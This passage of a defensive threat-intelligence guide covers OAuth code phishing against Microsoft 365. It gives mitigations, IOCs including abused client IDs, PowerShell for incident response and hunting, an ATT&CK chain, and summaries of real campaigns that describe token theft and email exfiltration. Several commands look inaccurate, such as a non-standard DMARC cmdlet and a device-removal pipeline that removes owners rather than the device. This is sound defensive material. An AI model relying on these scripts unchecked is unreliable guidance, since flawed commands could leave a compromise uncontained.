1. Navigate to **Microsoft 365 Defender** → **Cloud Apps** → **Activities**
2. Set up alert for:
   - "Impossible travel detected"
   - "Activity from infrequent country"
   - "Mass download of files"
   - "Mass email export"

---

**5. Implement DMARC/DKIM to Prevent Email Spoofing**

Even though OAuth phishing uses legitimate Microsoft URLs, attackers often spoof email sender addresses.

**PowerShell:**

```powershell
# Enforce DMARC policy
Set-DmarcPolicy -Policy "reject"
```

---

**6. Monitor Device Registration Activity**

Alert when devices are registered outside normal business context.

**PowerShell:**

```powershell
# Search for device registrations
Search-UnifiedAuditLog -Operations "Add device" -StartDate (Get-Date).AddDays(-7)
```

---

### Priority 3: MEDIUM

**7. User Security Awareness Training**

Train users on OAuth phishing specifically:

- **Message:** "Legitimate companies will never ask you to share authorization codes or URLs from your browser"
- **Message:** "If a person you don't know well asks you to authenticate to Microsoft, verify via phone or official channel first"
- **Message:** "Be especially cautious of unsolicited Signal/WhatsApp messages asking to join meetings"

---

**Validation Command (Verify Mitigations):**

```powershell
# Verify admin consent requirement is enabled
Get-MgBetaPolicyAuthorizationPolicy | Select-Object -ExpandProperty DefaultUserRolePermissions

# Verify VSCode is blocked in conditional access
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*VSCode*" }
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Technical IOCs:**

- **VSCode client ID in sign-in logs:** `aebc6443-996d-45c2-90f0-388ff96faa56` with Graph API access
- **Device Registration Service access:** `01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9` resource
- **New device registered with suspicious OS version:** `10.0.19041.928`
- **Graph API calls to `/me/messages` from non-browser client**
- **Batch email downloads via Graph API**
- **Multiple concurrent sign-in sessions using refresh tokens**

**Behavioral IOCs:**

- **Sign-in from legitimate Microsoft IP followed by bulk email export**
- **OAuth consent event followed by immediate device registration**
- **Impossible travel:** Sign-in and email access from geographically distant locations within minutes
- **Access to mail data outside typical business hours**

### Forensic Artifacts

**Sign-In Logs:**

- **OAuth authorization events** (AppId = VSCode or Auth Broker)
- **Token issuance events**
- **Device registration events**

**Graph Activity Logs:**

- **Calls to `/me/messages`** – Email enumeration
- **Calls to `/me/events`** – Calendar access
- **Calls to `/me/drive`** – OneDrive access

**Audit Logs:**

- **"Add device" operations** by Device Registration Service
- **"Add user to device" operations**

### Response Procedures

**Immediate Actions (0-15 minutes):**

1. **Revoke User Sessions:**

```powershell
Revoke-AzureADUserAllRefreshToken -ObjectId (Get-MgUser -Filter "userPrincipalName eq 'alice@company.onmicrosoft.com'").Id
```

2. **Reset Passwords:**

```powershell
Update-MgUser -UserId "alice@company.onmicrosoft.com" -ForceChangePasswordNextSignIn $true
```

3. **Revoke Registered Devices:**

```powershell
# Find and remove suspicious devices
Get-MgDeviceRegisteredOwner -DeviceId "12345678-1234-1234-1234-123456789012" | Remove-MgDevice
```

4. **Revoke OAuth Tokens:**

```powershell
# Revoke all OAuth tokens for the user
Revoke-AzureADUserAllRefreshToken -ObjectId (Get-MgUser -Filter "userPrincipalName eq 'alice@company.com'").Id
```

**Containment (15-60 minutes):**

5. **Search for Email Exfiltration:**

```powershell
Search-UnifiedAuditLog -UserIds "alice@company.onmicrosoft.com" `
  -Operations "Export" `
  -StartDate (Get-Date).AddDays(-7)
```

6. **Identify Secondary Victims:**

```powershell
# Find other users who may have fallen victim to same OAuth attack
Search-UnifiedAuditLog -Operations "Consent to application" `
  -StartDate (Get-Date).AddDays(-7) | `
  Where-Object { $_.AuditData -like "*aebc6443-996d-45c2-90f0-388ff96faa56*" }
```

**Recovery (1-24 hours):**

7. **Enable MFA on Compromised Account:**

```powershell
# Re-register user for MFA
# (Requires separate enrollment process)
```

8. **Threat Hunt for Similar Attacks:**

```powershell
# Look for VSCode OAuth usage across tenant
Search-UnifiedAuditLog -Operations "*OAuth*" `
  -StartDate (Get-Date).AddDays(-30) | `
  Where-Object { $_.AuditData -like "*aebc6443-996d-45c2-90f0-388ff96faa56*" }
```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | T1589 (Gather Victim Identity) | **Attacker identifies target via LinkedIn/OSINT** |
| **2** | **Initial Access** | T1566.002 (Phishing: Spearphishing) | **[IA-PHISH-006] Attacker sends OAuth phishing URL via Signal/WhatsApp** |
| **3** | **Credential Access** | T1528 (Steal Application Access Token) | **Attacker obtains authorization code and exchanges for access token** |
| **4** | **Impact** | T1537 (Transfer Data to Cloud) | **Attacker downloads emails, calendar, contacts via Graph API** |
| **5** | **Persistence** | T1098 (Account Manipulation) | **[METHOD 2] Attacker registers device and obtains PRT for long-term access** |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: Volexity UTA0352 Campaign (March-April 2025)

**Threat Actor:** Russian state-sponsored, targets NGOs and human rights organizations

**Timeline:**

- **March 1-7, 2025:** Attacker establishes rapport via Signal posing as Romanian Ministry official
- **March 8, 2025:** Attacker sends phishing PDF with "meeting instructions"
- **March 9, 2025:** Attacker sends VSCode OAuth phishing URL
- **March 9, 2025:** Victim clicks and shares authorization code
- **March 9-15, 2025:** Attacker downloads 500+ emails from victim's mailbox

**Targets Impersonated:**

- Permanent Representation of Romania to the European Union
- Mission of Ukraine to the European Union
- Permanent Delegation of Bulgaria to NATO

**Social Engineering Tactics:**

- Detailed PDF documents with fake ministry letterhead
- Multi-day conversation to build credibility
- Referencing current geopolitical events (Ukraine) to increase relevance
- Legitimate Microsoft infrastructure (no attacker-hosted pages)

**Impact:**

- Confidential NGO communications exfiltrated
- Human rights defender identities exposed
- Donor information compromised
- Strategic information about Ukraine support efforts gathered

**References:**

- [Volexity - Phishing for Codes (April 22, 2025)](https://www.volexity.com/blog/2025/04/22/phishing-for-codes-russian-threat-actors-target-microsoft-365-oauth-workflows/)

---

### Example 2: Proofpoint OAuth Campaign (Q1 2025)

**Threat Actor:** Financially-motivated, likely using Tycoon phishing-as-a-service

**Scale:**

- **900+ M365 organizations targeted**
- **3,000+ users phished**
- **50%+ successful compromise rate**

**Impersonated Applications:**

- Adobe (4+ applications)
- DocuSign (5+ applications)
- RingCentral
- SharePoint
- Other enterprise SaaS tools

**Attack Flow:**

1. Email sent to target with fake SaaS application login link
2. Link redirects to attacker-controlled phishing page
3. Attacker captures credentials and MFA token via Tycoon AiTM kit
4. Attacker uses credentials to create OAuth malicious apps
5. Attacker grants consent for these apps in victim's tenant
6. Attacker uses apps to access M365 resources

**Tactics:**

- Used SendGrid for email delivery (to appear legitimate)
- Multiple redirect stages to confuse security analysis
- Impersonated known SaaS tools (increased victim trust)
- Deployed Tycoon PhaaS for sophisticated credential interception

**References:**

- [Proofpoint - Microsoft OAuth App Impersonation Campaign (July 30, 2025)](https://www.proofpoint.com/us/blog/threat-insight/microsoft-oauth-app-impersonation-campaign-leads-mfa-phishing)

---
